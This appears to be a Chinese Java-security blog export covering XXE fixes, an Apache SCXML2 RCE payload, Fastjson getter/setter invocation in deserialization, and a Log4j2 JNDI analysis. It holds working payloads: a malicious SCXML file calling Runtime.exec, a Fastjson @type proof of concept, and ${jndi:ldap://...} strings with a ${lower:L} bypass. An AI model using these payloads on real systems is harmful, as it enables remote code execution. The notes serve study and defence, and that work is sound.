spf.newSAXParser();parser.parse(InputSource, (HandlerBase) null);\n\n修复：\nSAXParserFactory spf = SAXParserFactory.newInstance();spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);SAXParser parser = spf.newSAXParser();parser.parse(InputSource, (HandlerBase) null);\n\ndom4j【可回显】&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;dom4j&lt;/groupId&gt;&lt;artifactId&gt;dom4j&lt;/artifactId&gt;&lt;version&gt;1.6.1&lt;/version&gt;&lt;/dependency&gt;&lt;/dependencies&gt;\n\n漏洞：\npublic static void SAXReader(String xml) throws DocumentException &#123;    SAXReader reader = new SAXReader();    // org.dom4j.Document document    reader.read(new InputSource(new StringReader(xml))); // cause xxe&#125;\n\n修复：\nSAXReader saxReader = new SAXReader();saxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);saxReader.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);saxReader.read(InputSource);\n\nSAXTransformerFactory[外带]只能打非回显的\n漏洞：\nSAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();StreamSource source = new StreamSource(InputSource);sf.newTransformerHandler(source);\n\n修复：\nSAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;);StreamSource source = new StreamSource(InputSource);sf.newTransformerHandler(source);\n\nSchemaFactory【外带】只能打外带\nSchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);StreamSource source = new StreamSource(ResourceUtils.getPoc1());Schema schema = factory.newSchema(InputSource);\n\n修复：\nSchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);StreamSource source = new StreamSource(InputSource);Schema schema = factory.newSchema(source);\n\nTransformerFactory【外带】只能打外带\nTransformerFactory tf = TransformerFactory.newInstance();StreamSource source = new StreamSource(InputSource);tf.newTransformer().transform(source, new DOMResult());\n\n修复：\nTransformerFactory tf = TransformerFactory.newInstance();tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;);StreamSource source = new StreamSourceInputSource);tf.newTransformer().transform(source, new DOMResult());\n\nValidatorSample【外带】只能外带\nSchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);Schema schema = factory.newSchema();Validator validator = schema.newValidator();StreamSource source = new StreamSource(InputSource);validator.validate(source);\n\n修复：\nSchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);Schema schema = factory.newSchema();Validator validator = schema.newValidator();validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);StreamSource source = new StreamSource(InputSource);validator.validate(source);\n\nXMLReader【外带】只能外带\nXMLReader reader = XMLReaderFactory.createXMLReader();reader.parse(new InputSource(InputSource));\n\n修复：\nXMLReader reader = XMLReaderFactory.createXMLReader();reader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);reader.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);reader.parse(new InputSource(InputSource));\n\nUnmarshaller【无漏洞】默认不存在XXE\nClass tClass = Some.class;JAXBContext context = JAXBContext.newInstance(tClass);Unmarshaller um = context.createUnmarshaller();Object o = um.unmarshal(inputStream);tClass.cast(o);\n\nscxml2【可RCE】参考\nhttps://1diot9.github.io/2025/11/18/HDCTF2023-BabyJxAx/\n[https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/](https://boogipop.com/2023/04/24/Apache SCXML2 RCE分析&#x2F;)\nhttps://xz.aliyun.com/news/11828\nhttps://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ\nNSSCTF可搜索BabyJxVx做题\n漏洞：\nString url = &quot;http://127.0.0.1:8000/1.xml&quot;SCXMLExecutor executor = new SCXMLExecutor();SCXML scxml = SCXMLReader.read(file);        executor.setStateMachine(scxml);        executor.go();\n\n恶意xml：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;&lt;state id=&quot;run&quot;&gt;&lt;onentry&gt;&lt;script&gt;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&lt;/script&gt;&lt;/onentry&gt;&lt;/state&gt;&lt;/scxml&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;    &lt;final id=&quot;run&quot;&gt;        &lt;onexit&gt;            &lt;send hints=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/send&gt;            &lt;log expr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/log&gt;            &lt;assign expr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot; location=&quot;1&quot;&gt;            &lt;/assign&gt;            &lt;cancel sendidexpr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/cancel&gt;            &lt;foreach array=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot; item=&quot;1&quot;&gt;            &lt;/foreach&gt;            &lt;if cond=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/if&gt;        &lt;/onexit&gt;    &lt;/final&gt;&lt;/scxml&gt;\n\n任选一个就行\n参考heihu师傅的私人笔记。wx公众号：Heihu Share\nhttps://jlkl.github.io/2020/08/24/Java_03/\nXXE\nXXE之java补充\nhttps://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/\nhttps://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ\nhttps://blog.spoock.com/2018/10/23/java-xxe/\n[https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/](https://boogipop.com/2023/04/24/Apache SCXML2 RCE分析&#x2F;)\nhttps://xz.aliyun.com/news/11828\nhttps://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"Fastjson源码分析","url":"/2025/12/04/Fastjson%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","content":"前言之前只是知道能够触发getter或setter，但是却不知道为什么，现在就来结合源码分析一下。\nparse和parseObject的区别这个其实相当于结论了，先总结一下，看源码的时候能够更清楚一点。\n\n就返回的类型比较：\n\nparse返回的是反序列化的类本身，而parseObject返回的是JSONObject类。\n也就是说parse(jsonString)返回Student类，parseObject(jsonString)返回JSONObject类。\n不过parseObject(jsonString, Student.class)返回的就是Student类了。\n\n就setter方法调用上：\n\n如果对应的字段存在setter方法，且该setter方法满足：非静态私有函数，返回类型为void或类本身，参数个数为一个。\n那么parse和parseObject（这里可以有一个或多个参数）的执行结果一样，即，调用所有满足上述条件的setter方法。\n\n就getter方法调用上：\n\n如果对应的字段存在getter方法，且该getter方法满足：非静态私有函数，返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong，无参数，并且该字段没有setter方法（不然在JavaBeanInfo.build()的时候会先放setter方法，导致getter方法放不进，后面会分析）。\n那么parse和parseObject(这里需要有两个以上的参数，即不能只有jsonString)的执行结果一样，即，调用所有满足上述条件的getter方法。\nparseObject(jsonString) 这种单参的情况会有所不同。除了像上面一样会调用符合条件的getter，还会再次调用一遍所有getter方法。这是因为parseObject(String text)会调用JSON.toJSON()。可以在getter方法上打个断点，然后再看前面的调用栈。\n\n小结一下：\n\nparse和多参parseObject都会调用符合条件的setter和getter。\n单参parseObject除了上面的，还会再调用一遍所有getter。\n正式分析参考代码首先，确保你的实体类里存在一个只有getter方法的字段，不然后面的derializer会变成ASMDerializer，这样分析流程就不一样了。\n我这里用的fastjson1.2.24\n这里给出一个实体类的示例：\nimport java.io.IOException;import java.util.HashMap;import java.util.Properties;public class Student &#123;    private String name;    private int age;    private String address;    private Properties properties;    private HashMap hashMap;    public Student() &#123;        System.out.println(&quot;构造函数&quot;);    &#125;    public HashMap getHashMap() &#123;        System.out.println(&quot;getHashMap&quot;);        return hashMap;    &#125;    public String getName() &#123;        System.out.println(&quot;getName&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;setName&quot;);        this.name = name;    &#125;    public int getAge() &#123;        System.out.println(&quot;getAge&quot;);        return age;    &#125;    public void setAge(int age) &#123;        System.out.println(&quot;setAge&quot;);        this.age = age;    &#125;    public String getAddress() &#123;        System.out.println(&quot;getAddress&quot;);        return address;    &#125;    public Properties getProperties() throws IOException &#123;        System.out.println(&quot;getProperties&quot;);        Runtime.getRuntime().exec(&quot;calc&quot;);        return properties;    &#125;//    public void setProperties(Properties properties) &#123;//        System.out.println(&quot;setProperties&quot;);//        this.properties = properties;//    &#125;&#125;\n\n然后反序列化可以用这个：\nimport com.alibaba.fastjson.JSON;public class FastjsonEasyPoC &#123;    public static void main(String[] args)&#123;        String jsonString = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Student\\&quot;,\\&quot;age\\&quot;:6,&quot; +                &quot;\\&quot;name\\&quot;:\\&quot;Drunkbaby\\&quot;,\\&quot;address\\&quot;:\\&quot;china\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;, \\&quot;hashMap\\&quot;: &#123;&#125;&#125;&quot;;//        Object parseObject = JSON.parseObject(jsonString);//        System.out.println(parseObject);//        System.out.println(parseObject.getClass().getName());//        System.out.println(&quot;\\n&quot;);        Object parse = JSON.parse(jsonString);        System.out.println(parse);        System.out.println(parse.getClass().getName());    &#125;&#125;\n\n这里先测试parse，parse和多参parseObject的结果是一样的。\n调试流程parse我们直接在ParserConfig的526行打断点：\n\n前面的流程不是很重要，不过还是建议自己看一遍，这里我结合调用栈稍微讲一下：\n\n一开始就是不断parse，业务层层包装，解析json数据，最终我们这里的json数据需要get一个Deserializer去反序列化，最后找到的Deserializer是一个JavaBeanDeserializer，然后就要去build，即重构JavaBean的内容，包括有哪些setter方法，哪些字段，哪些getter方法。我们重点来看一下build的过程。\n首先，获得json类中的Field，Method，DefaultConstructor，可以自己去看一下变量里的信息：注意，由于是getMethods，所以private方法无法获取。\n\n接下来，是对Method的一个遍历，这个很重要：\n\n先做四个判断，方法名长度大于4，方法不能是静态的，方法返回类型为void或返回类型是这个类本身(这里是Student)，方法的参数数量为1，只有这样才不会continue。这些满足条件的setter其实就是我们一开始总结的。可以发现setName是符合条件的，继续步过：\n\n这里需要满足方法开头为set，之后就会取出字段名，这里是name。\n最后，通过add，把刚刚得到的方法名，字段名等信息包装成FieldInfo，并存入fieldList：\n\n接下来就是循环重复，所以我们直接在下面打断点：\n\n不过由于这里是get public static fields，我们的Student并没有，所以会直接跳到下一个循环：\n\n这里跟第一个循环很像，只不过是针对getter的，条件其实就跟一开始总结的一样。\n下面这一行很重要：\n\n如果一开始已经把setter存入fieldList，那么同一个字段的getter方法就存不进fieldList了，这就是为什么一个字段必须只存在getter方法，他的getter方法才会被调用。\n现在回到createJavaBeanDeserializer方法下：\n\n这里properties属性只有getter方法，这样asmEnable才会被设置为false，这样才不会进入ASM机制。\n接下来直接回到DefaultJSONParse.parseObject()，368行：\n\n跟进这个deserialze，这里我直接在setter方法上打断点了，这样往前看调用栈就行：\n\n这样就可以很容易看出为什么会调用getter，setter了，这里不多讲了。\n同时也可以发现，parse和parseObject其实最终都会走到DefaultJSONParser.parseObject()，也就是都走到parseObject。\nparseObject来看看为什么单参parseObject会调用所有getter\n把下面的注释掉就行。\n\n在这里打个断点：\n\n运行到新打的断点，我这里还是选择在Student上打断点，然后反过来看调用栈：\n\n实际上还是用到了之前的FieldInfo，不过这里的获取序列化器的过程用到ASM机制，这个比较复杂，这里不做解释，感兴趣的可以在这里打断点去调试：\n\n总结这里主要分析了一下parse和parseObject在什么时候会调用getter，setter。也算是自己第一次分析组件源码吧，当时花了大半天。\n总结一下fastjson反序列化的机制：\n1、通过字符串的截取，将你指定的类加载为Class对象\n2、尝试获取反序列化器，如果不是默认的几个基本数据类型，则会被当成普通的JavaBean，从而去创建JavaBean反序列化器\n3、在创建JavaBean反序列化器的过程中，会构建JavaBeanInfo，里面会选取符合要求的Field及其对应方法，并将其添加到fieldList里，这是决定getter，setter调用的关键\n4、获取到反序列化器后，开始反序列化过程，通过反射调用setter还原对象，并根据情况调用getter方法\n5、如果是单参的parseObject，最后返回的就是jsonObject。由于jsonObject能通过toJSONString还原成json格式，所以JSON.toJSON里一定调用了getter方法。\n参考Java反序列化Fastjson篇05-写给自己看的一些源码深入分析 | Drunkbaby’s Blog\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"Log4j2漏洞分析","url":"/2025/12/08/Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"前言刚学JNDI时看过log4j2，但当时只是简单看了一下payload，对解析过程并不熟悉，现在来重新看一遍。\n这里的目标：\n1、了解漏洞的触发条件\n2、了解payload在组件中的解析过程，看懂字符串的处理过程，进而明白bypass的由来\n3、其他利用方式，包括其他协议以及不出网\n4、补丁分析与绕过\n5、jdk17下的利用\n6、为什么会触发多次\n文章涉及到的代码：https://github.com/1diot9/MyJavaSecStudy/tree/main/JNDI/Log4j2\n测试环境：jdk8u65\n漏洞复现这里先复现一下漏洞，看看效果。\npom.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;com.test&lt;/groupId&gt;    &lt;artifactId&gt;Log4j2&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;properties&gt;        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;        &lt;log4j2.version&gt;2.14.1&lt;/log4j2.version&gt;     &lt;!-- &lt;=2.14.1 有漏洞--&gt;    &lt;/properties&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;            &lt;version&gt;$&#123;log4j2.version&#125;&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;            &lt;version&gt;$&#123;log4j2.version&#125;&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;\n\nresources&#x2F;log4j2.xml，里面有详细注释，帮助理解配置文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!--status=&quot;WARN&quot;：控制 Log4j2 自身的内部日志级别（不是应用日志）。如果 Log4j2 出现错误或警告，会在控制台打印。--&gt;&lt;!--monitorInterval=&quot;30&quot;：表示每隔 30 秒检查一次配置文件是否被修改，如果修改了会自动重新加载。--&gt;&lt;Configuration status=&quot;WARN&quot; monitorInterval=&quot;30&quot;&gt;    &lt;!--日志输出目标--&gt;    &lt;Appenders&gt;        &lt;!--输出到控制台--&gt;        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;            &lt;!--时间戳 线程名 日志级别（INFO/DEBUG 等） Logger 名称，最多显示 36 个字符 日志消息 换行--&gt;            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;        &lt;/Console&gt;        &lt;!--输出到文件 logs/app.log--&gt;  &lt;!--filePattern：日志滚动时的文件命名规则，例如 logs/app-2025-12-04-1.log.gz--&gt;        &lt;RollingFile name=&quot;File&quot; fileName=&quot;logs/app.log&quot; filePattern=&quot;logs/app-%d&#123;yyyy-MM-dd&#125;-%i.log.gz&quot;&gt;            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; %-5level %logger - %msg%n&quot;/&gt;            &lt;Policies&gt;                &lt;SizeBasedTriggeringPolicy size=&quot;10MB&quot;/&gt;  &lt;!--文件超过 10MB 时滚动--&gt;                &lt;TimeBasedTriggeringPolicy/&gt;    &lt;!--按时间滚动（通常是每天）--&gt;            &lt;/Policies&gt;            &lt;DefaultRolloverStrategy max=&quot;7&quot;/&gt;  &lt;!--最多保留 7 个历史文件，超过会删除旧的--&gt;        &lt;/RollingFile&gt;    &lt;/Appenders&gt;    &lt;Loggers&gt;        &lt;!--针对 com.example 包下的类，日志级别设为 error；这里代表error以上的才会被解析记录，所以只有error以上的才能触发漏洞；可以在java类中临时更改记录等级--&gt;        &lt;!--additivity=&quot;false&quot; 表示不再向上级 Root Logger 传递日志，避免重复输出--&gt;        &lt;!--trace &lt; debug &lt; info &lt; warn &lt; error &lt; fatal--&gt;        &lt;Logger name=&quot;com.example&quot; level=&quot;error&quot; additivity=&quot;false&quot;&gt;            &lt;!--绑定两个 Appender：控制台和文件--&gt;            &lt;AppenderRef ref=&quot;Console&quot;/&gt;            &lt;AppenderRef ref=&quot;File&quot;/&gt;        &lt;/Logger&gt;        &lt;!--所有没有单独配置的 Logger 都会走 Root--&gt;        &lt;Root level=&quot;info&quot;&gt;            &lt;AppenderRef ref=&quot;Console&quot;/&gt;        &lt;/Root&gt;    &lt;/Loggers&gt;&lt;/Configuration&gt;\n\nApp.java\npackage com.example;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.core.config.Configurator;public class App &#123;    private static final Logger logger = LogManager.getLogger(App.class);    public static void main(String[] args) &#123;        /* 临时修改记录的日志等级 */        Configurator.setLevel(&quot;com.example.App&quot;, org.apache.logging.log4j.Level.DEBUG);        String username = &quot;$&#123;sys:user.name&#125;&quot;;        String str2 = &quot;$&#123;sys:java.version&#125;&quot;;        String vul = &quot;$&#123;jndi:ldap://127.0.0.1:50389/71c916&#125;&quot;;        logger.trace(&quot;跟踪信息&quot;);        logger.debug(&quot;调试信息&quot;);        logger.info(&quot;应用启动&quot;);        logger.warn(&quot;警告示例&quot;);        logger.error(&quot;错误示例&quot;);        logger.fatal(&quot;致命错误示例&quot;);        logger.trace(&quot;&#123;&#125;&quot;, username);        logger.info(&quot;&#123;&#125;&quot;, str2);        logger.info(&quot;&#123;&#125;&quot;, vul);//        logger.error(&quot;&#123;&#125;&quot;,vul);        try &#123;            int x = 1 / 0;        &#125; catch (Exception e) &#123;            logger.error(&quot;发生异常&quot;, e);        &#125;    &#125;&#125;\n\n恶意ldap服务器我用java-chains起：\n\n运行后成功执行calc，而且是弹了4个。\n调试分析触发条件分析除了组件版本&lt;&#x3D;2.14.1，设置的日志输出等级也会影响是否能触发漏洞。因为这里漏洞触发的本质是，组件需要打印日志，所以才去解析用户输入。如果组件判断不需要打印日志的话，就不会有解析这一步了。\n我直接在javax.naming.spi.DirectoryManager#getObjectInstance打断点，因为触发的ldap，所以最后肯定会到这儿。复制一下堆栈：\ngetObjectInstance:161, DirectoryManager (javax.naming.spi)c_lookup:1085, LdapCtx (com.sun.jndi.ldap)p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:94, ldapURLContext (com.sun.jndi.url.ldap)lookup:417, InitialContext (javax.naming)lookup:172, JndiManager (org.apache.logging.log4j.core.net)lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)toText:244, PatternLayout (org.apache.logging.log4j.core.layout)encode:229, PatternLayout (org.apache.logging.log4j.core.layout)encode:59, PatternLayout (org.apache.logging.log4j.core.layout)directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)log:481, LoggerConfig (org.apache.logging.log4j.core.config)logParent:531, LoggerConfig (org.apache.logging.log4j.core.config)processLogEvent:500, LoggerConfig (org.apache.logging.log4j.core.config)log:481, LoggerConfig (org.apache.logging.log4j.core.config)log:456, LoggerConfig (org.apache.logging.log4j.core.config)log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)log:161, Logger (org.apache.logging.log4j.core)tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)logMessage:2034, AbstractLogger (org.apache.logging.log4j.spi)logIfEnabled:1899, AbstractLogger (org.apache.logging.log4j.spi)info:1444, AbstractLogger (org.apache.logging.log4j.spi)main:25, App (com.example)\n\n这里简单扫一眼，能看到最底下，倒数第三行，有一个比较显眼的方法——logIfEnabled，看一下代码：\n\n这里最关键是这个if条件，跟进isEnabled，再跟进filter：\n\nApp里设置的打印等级为debug，对应500；漏洞触发点是logger.info，对应400。因此能够满足条件，进入后续解析。\n补充一下日志等级排序：trace &lt; debug &lt; info &lt; warn &lt; error &lt; fatal\n打印等级可以在配置文件设置，也可以在代码中临时修改：\n\n\n关于日志级别修改，也可以参考官方文档：https://logging.apache.ac.cn/log4j/2.x/manual/customloglevels.html\n总结：\n除了版本&lt;&#x3D;2.14.1，还需要看设置的日志等级和触发点的日志等级。\npayload解析分析还是用上面的App.java，不过可以把前面的都注释，只留下最后的jndi触发点。\n这里稍微改一下，vul改成下面的，方便展示嵌套解析的情况。\nvul = &quot;$&#123;jndi:$&#123;lower:L&#125;dap://127.0.0.1:50389/b67a28&#125;&quot;;\n\n调用栈也是和上面一样的。\n自己分析的时候，我喜欢从上往下分析调用栈，所以这里也采取这种方式。\nInterpolator#lookup首先看到Interpolator#lookup：\n\n更上面的调用栈不看了，因为就是一步步走到经典JNDI的过程。这里看到，已经取出${}里面的文本了，并且根据冒号做了分割，关键代码的作用已在图上标出。\n这个方法的主要功能是：根据冒号分割协议与文本，根据协议从strLookupMap中获取合适的lookup对象，并调用lookup方法完成进一步解析。\n看看strLookupMap还能解析哪些协议：\n\n这些协议为后面的进一步利用或绕过提供了思路。\n这在官方文档中也有提到：\nhttps://logging.apache.ac.cn/log4j/2.x/manual/configuration.html#PropertySubstitution\n\nStrSubstitutor#substitute再往前看调用栈，这里我关注的是StrSubstitutor#substitute：\n\n前后的调用栈都是一些简单的调用，而这个方法从篇幅看就比较重要，从上下文看，这个方法处理后，${}就消失了。所以，我应该重点看看这个方法。\n开头就定义了一些matcher，如图：\n\n分别匹配${，}，:-。这里的 :- 是第一次出现，不知道干什么用的，留意一下。\n接着，进入while循环，一个个字符遍历传入的日志消息，这里是${jndi:ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28}\n当满足当前pos（position的缩写）的字符是$，下一个字符是{时，即出现 ${ 时，startMatchLen等于2，进入else if和else判断：\n\n中间的else if 是处理转义字符的，其判断逻辑是，当前pos的前一个字符是转义字符的话，就不进行解析，并删除转义字符，也是一个常见的功能。不过这里的转义字符是$。所以$${jndi:ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28}最终会被日志打印为：\n\n继续看下面的else，代码如图：\n\n先关注一下如何处理嵌套情况。在962行，会继续判断是否出现 ${ ，出现的话，nestedVarCount++，即嵌套数加一。当出现suffix尾缀，即 } 时，会在974行判断是否有嵌套次数，有的话，就不进入解析，而是对nestedVarCount–。这样做的目的是为了找到匹配的 ${ 和 } 以我们一开始的${jndi:${lower:L}dap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28}为例，第一个${ 应该对应最后的 } ，而不是 L} 中的 } 。\n当遍历到最后一个 } 时，能够进入 nestedVarCount &#x3D;&#x3D; 0 的判断，开始解析：\n\n可以看到，这里已经脱去了最外层的 ${} ，然后又嵌套调用 substitute方法，继续对存在的 ${} 进行处理。\n总结一下，substitute会通过嵌套处理，一层层脱去 ${} ，先解析最里面的。\n继续看nestedVarCount &#x3D;&#x3D; 0 这个if中的逻辑。\n首先是将内部嵌套的进行解析，一开始的${jndi:${lower:L}dap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28}变成了jndi:ldap:&#x2F;&#x2F;127.0.0.1:50389&#x2F;b67a28，如图：\n\n接下来会进入到一些特殊分隔符的匹配，如图：\n\n这个等一下会单独讲，先继续看下面的。\n如果没有特殊分隔符，最终就会通过resolveVariable对varName，也就是传入的payload进行处理：\n\n跟进后，就是上一部分Interpolator#lookup的内容了，即根据协议找lookup对象，然后进行解析。\n特殊分隔符分析回到刚刚跳过的部分\n\n这里主要有两种分隔符，:&#x2F;-和:-\n这里面会涉及到两个比较重要的变量，varName和varDefaultValue。前者最终进入resolveVariable进行解析（比如jndi:ldap:&#x2F;&#x2F;xxxx），后者作为解析结果为空时的默认值。\n具体作用如下：\n1、举例说明 :-\n\n${a:-b}\n\n首先被处理成a:-b，然后a:-b被赋值为varName，最终进入resolveVariable解析，被拆分成a, -b，a对应协议部分，-b对应协议内容，如图：\n\n这样自然不会产生解析结果，因此原样打印日志：\n\n\n${a:-b123:-xyz}\n\n首先被处理成a:-b123:-xyz，这时候由于进入的是:-的if，所以会继续向后检测 :- 。最终，会先把前面的a:-b123进一步处理成a:b123作为varName，并把xyz作为varDefaultValue，如图：\n\n于是，最终进入resolveVariable解析的就是a:b123，这样也自然不会解析成功。这时候，varDefaultValue就派上用场，作为最终的解析结果，如图：\n\n\n这里说实话感觉挺奇怪的，理论上varName应该是a:-b123才对，不然反斜杠转义的意义何在？\n\n${a:-b123:-xyz:-qwe}\n\n找到第一个:-后，后面的就全是varDefaultValue了，所以日志结果为：\n\n2、举例说明 :-\n\n${a:-b123:-xyz}\n\n这里的逻辑更简单点，将第一个 :- 后的内容作为varDefaultValue，前面的作为varName，代码如图：\n\na自然无法被resolve解析，最终的日志结果：\n\n\n${a:b123:-xyz321:-qwe}\n\n分成a:b123   xyz321:-qwe两部分，前面作为varName，进入resolve解析，后面作为varDefaultValue。\n最终日志：\n\n\n${sys:java.version:-xyz123}\n\n这时候varName部分解析成功，自然输出解析后的内容：\n\n关于默认属性这一点，官方文档也有提到：\nhttps://logging.apache.ac.cn/log4j/2.x/manual/configuration.html#PropertySubstitution\n\n总结一下，可以写成 ${a:b:-default} 形式，当前面的协议无效时，就会取后面的默认值。\n那我前言里写的灰盒测试是什么意思呢？其实就是在发现有 :-，:- 这种matcher后，不去仔细看源码，而是直接写几个案例运行，看输出结果，从而确定这些特殊分隔符的作用。这个时候，如何构造合适的例子就很重要。同样的方式也可以运用在，由于对URL的解析不同，从而造成权限绕过的漏洞上。这部分可以看：\n7. 